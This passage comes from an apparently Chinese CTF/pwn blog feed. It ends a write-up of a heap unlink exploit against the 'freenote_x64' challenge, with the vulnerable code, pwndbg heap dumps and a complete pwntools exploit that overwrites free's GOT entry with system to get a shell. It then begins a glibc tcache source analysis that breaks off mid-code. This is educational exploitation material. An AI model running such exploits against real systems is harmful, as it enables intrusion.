class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = 